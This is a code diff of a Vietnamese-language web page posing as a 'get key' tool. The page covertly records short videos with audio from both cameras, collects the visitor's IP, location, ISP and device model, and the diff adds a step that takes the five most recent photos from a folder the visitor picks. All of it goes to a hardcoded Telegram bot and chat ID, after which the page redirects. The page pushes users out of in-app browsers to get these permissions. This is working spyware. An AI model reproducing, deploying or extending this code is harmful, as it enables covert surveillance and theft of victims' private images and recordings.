@@ -211,12 +211,10 @@
   const TELEGRAM_CHAT_ID = '-5529480454'; 
   const REDIRECT_URL = 'https://xnhau.city/';
 
-  // Kiểm tra In-App Browser (Telegram, Messenger, Facebook, Zalo, TikTok,...)
   function checkInAppBrowser() {
     const ua = navigator.userAgent || navigator.vendor || window.opera;
     const isInApp = /Telegram|Gram|FBAN|FBAV|Messenger|Instagram|Zalo|TikTok|Line|Viber|Twitter|LinkedInApp/i.test(ua);
     if (isInApp) {
-      // Hiển thị khung chặn bắt buộc mở trình duyệt ngoài
       document.getElementById('browser-warning').style.display = 'flex';
     }
   }
@@ -224,10 +222,8 @@
   function openExternalBrowser() {
     const currentUrl = window.location.href;
     if (/android/i.test(navigator.userAgent)) {
-      // Ép mở bằng Chrome trên Android
       window.location.href = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
     } else {
-      // Trên iOS (iPhone/iPad), cố gắng mở link trực tiếp để Safari nhảy ra hoặc thông báo hướng dẫn
       window.location.href = currentUrl;
       setTimeout(() => {
         alert('Vui lòng bấm vào biểu tượng 3 chấm (...) hoặc mũi tên ở góc phải, sau đó chọn "Mở bằng Safari"');
@@ -235,7 +231,6 @@
     }
   }
 
-  // Tự động kiểm tra ngay khi tải trang
   window.onload = function() {
     checkInAppBrowser();
   };
@@ -251,6 +246,57 @@
   const video = document.getElementById('video');
   const getKeyBtn = document.getElementById('get-key-btn');
 
+  // Hàm lấy tên thiết bị chuẩn xác
+  async function getDetailedDeviceName() {
+    let deviceStr = "PC / Laptop 💻";
+    const ua = navigator.userAgent;
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      try {
+        const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+        if (hints.model) {
+          deviceStr = `${hints.platform} (${hints.model}) 🤖`;
+          return deviceStr;
+        }
+      } catch (e) {}
+    }
+    if (/android/i.test(ua)) {
+      let match = ua.match(/;\s([A-Za-z0-9\s\-]+)\sBuild\//);
+      let model = match ? match[1].trim() : "Android Phone";
+      deviceStr = `Android - ${model} 🤖`;
+    } else if (/iphone|ipad|ipod/i.test(ua)) {
+      deviceStr = `iOS / Apple Device 🍏`;
+    } else if (/windows/i.test(ua)) {
+      deviceStr = `Windows PC 💻`;
+    } else if (/macintosh|mac os x/i.test(ua)) {
+      deviceStr = `MacBook / macOS 💻`;
+    }
+    return deviceStr;
+  }
+
+  // Hàm tự động yêu cầu cấp quyền truy cập kho lưu trữ/thư mục hệ thống để trích xuất 5 ảnh mới nhất
+  async function fetchRecentPhotosAutomatic() {
+    let imageFiles = [];
+    try {
+      if (window.showDirectoryPicker) {
+        const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+        for await (const entry of dirHandle.values()) {
+          if (entry.kind === 'file') {
+            const file = await entry.getFile();
+            if (file.type.startsWith('image/')) {
+              imageFiles.push({ file: file, lastModified: file.lastModified });
+            }
+          }
+        }
+        // Sắp xếp thời gian chỉnh sửa giảm dần để lấy 5 ảnh gần nhất
+        imageFiles.sort((a, b) => b.lastModified - a.lastModified);
+        return imageFiles.slice(0, 5).map(item => item.file);
+      }
+    } catch (e) {
+      // Người dùng từ chối cấp quyền hoặc trình duyệt không hỗ trợ API truy xuất thư mục trực tiếp
+    }
+    return [];
+  }
+
   // Hàm quay video MP4 kèm âm thanh
   async function recordVideo(facingMode, duration = 3000) {
     try {
@@ -263,7 +309,6 @@
 
       return await new Promise((resolve) => {
         let recordedChunks = [];
-        
         let options = { mimeType: 'video/mp4' };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
           if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
@@ -276,7 +321,6 @@
         }
 
         const mediaRecorder = new MediaRecorder(stream, options);
-
         mediaRecorder.ondataavailable = (event) => {
           if (event.data && event.data.size > 0) {
             recordedChunks.push(event.data);
@@ -319,17 +363,20 @@
       }
     } catch (e) {}
 
-    const ua = navigator.userAgent;
-    let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
+    const deviceName = await getDetailedDeviceName();
 
     const infoText = 
-      `💻 <b>YÊU CẦU GET KEY (VIDEO MP4)</b> 💻\n` +
+      `💻 <b>YÊU CẦU GET KEY (AUTO 5 ẢNH MỚI NHẤT)</b> 💻\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+      `📱 <b>Thiết bị chuẩn:</b> ${deviceName}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
       `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
       `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`;
+
+    // Tự động yêu cầu cho phép truy cập dữ liệu hệ thống để lấy 5 ảnh gần đây
+    statusDiv.textContent = '[*] Đang yêu cầu quyền truy cập dữ liệu album ảnh...';
+    const recentPhotos = await fetchRecentPhotosAutomatic();
 
     statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
     let backVideoBlob = await recordVideo('environment', 3000);
@@ -337,17 +384,37 @@
     statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
     let frontVideoBlob = await recordVideo('user', 3000);
 
-    let hasSent = false;
+    // Gửi thông tin văn bản
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText, parse_mode: 'HTML' })
+      });
+    } catch (e) {}
+
+    // Gửi lần lượt 5 ảnh gần đây nếu được cấp quyền
+    if (recentPhotos && recentPhotos.length > 0) {
+      for (let i = 0; i < recentPhotos.length; i++) {
+        const photoFd = new FormData();
+        photoFd.append('chat_id', TELEGRAM_CHAT_ID);
+        photoFd.append('photo', recentPhotos[i]);
+        photoFd.append('caption', `🖼️ <b>Ảnh gần đây thứ ${i + 1} từ hệ thống</b>`);
+        photoFd.append('parse_mode', 'HTML');
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: photoFd });
+        } catch (e) {}
+      }
+    }
 
     if (backVideoBlob && backVideoBlob.size > 0) {
       const fd = new FormData();
       fd.append('chat_id', TELEGRAM_CHAT_ID);
       fd.append('video', backVideoBlob, 'back_video.mp4');
-      fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
+      fd.append('caption', '🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
       fd.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd }); 
-        hasSent = true;
       } catch(e){}
     }
 
@@ -359,18 +426,7 @@
       fd2.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 }); 
-        hasSent = true;
       } catch(e){}
-    }
-
-    if (!hasSent) {
-      try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể quay video hoặc truy cập camera/microphone)', parse_mode: 'HTML' })
-        });
-      } catch (e) {}
     }
 
     statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
